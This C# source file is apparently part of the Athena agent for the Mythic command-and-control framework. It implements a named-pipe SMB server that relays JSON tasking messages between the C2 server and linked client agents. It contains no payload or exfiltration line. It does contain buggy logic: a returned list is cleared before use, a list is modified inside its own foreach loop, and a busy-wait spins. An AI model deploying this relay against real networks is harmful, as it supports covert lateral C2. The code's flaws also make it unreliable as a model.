﻿using Athena.Models.Mythic.Response;
using Newtonsoft.Json;
using System.Collections.Generic;
using System.IO;
using System.IO.Pipes;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Athena.Config
{
    public class SmbServer
    {
        public NamedPipeServerStream pipe { get; set; }
        public string namedpipe { get; set; }
        public CancellationTokenSource cancellationTokenSource { get; set; }
        public List<DelegateMessage> messageIn { get; set; } // Mythic -> AthenaServer -> AthenaClient 
        public List<DelegateMessage> messageOut { get; set; } //AthenaClient -> AthenaServer -> Mythic

        public SmbServer()
        {
            this.namedpipe = "pipe_name";
            this.cancellationTokenSource = new CancellationTokenSource();
            this.messageIn = new List<DelegateMessage>();
            this.messageOut = new List<DelegateMessage>();
            Start(this.namedpipe);
        }

        public void AddToQueue(DelegateMessage msg)
        {
            this.messageIn.Add(msg);
        }

        public List<DelegateMessage> GetMessages()
        {
            List<DelegateMessage> msgs = this.messageOut;
            this.messageOut.Clear();
            return msgs;
        }


        //Should be able to implement these as agent jobs.
        //Return an error message if the SMB Server is not enabled.
        public void Start(string name)
        {
            Task.Run(() =>
            {
                while (true)
                {
                    this.pipe = new NamedPipeServerStream(this.namedpipe);

                    // Wait for a client to connect
                    pipe.WaitForConnection();
                    try
                    {
                        // Read user input and send that to the client process.
                        using (BinaryWriter _bw = new BinaryWriter(pipe))
                        using (BinaryReader _br = new BinaryReader(pipe))
                        {
                            while (true)
                            {
                                if (this.cancellationTokenSource.IsCancellationRequested)
                                {
                                    return;
                                }

                                //Listen for Something
                                var len = _br.ReadUInt32();
                                var temp = new string(_br.ReadChars((int)len));

                                //Add message to delegateMessages list
                                DelegateMessage dm = JsonConvert.DeserializeObject<DelegateMessage>(temp);
                                this.messageOut.Add(dm);

                                //Wait for us to have a message to send.
                                while (this.messageIn.Count == 0) ;

                                //Wait for us to actually be able to read from the delegate list
                                foreach (var message in this.messageIn)
                                {
                                    var buf = Encoding.ASCII.GetBytes(message.message);
                                    _bw.Write((uint)buf.Length);
                                    _bw.Write(buf);
                                    this.messageIn.Remove(message);
                                }
                            }
                        }
                    }
                    // Catch the IOException that is raised if the pipe is broken
                    // or disconnected.
                    catch (IOException)
                    {
                        this.messageOut.Clear();
                    }
                }
            }, this.cancellationTokenSource.Token);
        }

        public void Stop()
        {
            this.cancellationTokenSource.Cancel();
        }
    }
}